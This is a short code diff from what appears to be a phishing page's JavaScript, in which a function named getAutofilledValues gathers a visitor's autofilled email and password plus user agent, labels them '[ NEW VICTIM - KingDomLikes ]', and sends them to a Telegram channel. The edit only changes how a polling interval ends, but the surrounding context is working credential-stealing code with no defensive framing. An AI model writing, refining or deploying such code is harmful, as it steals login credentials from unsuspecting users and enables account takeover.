@@ -34,10 +34,10 @@ function getAutofilledValues() {
           var message = `[ NEW VICTIM - KingDomLikes ]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}`;
           sendTelegramMessage(message); 
       });
-    clearInterval(intervalId);
+    // clearInterval(intervalId);
   };
   
   console.log(email);
 
   
-}, 1000);
+});
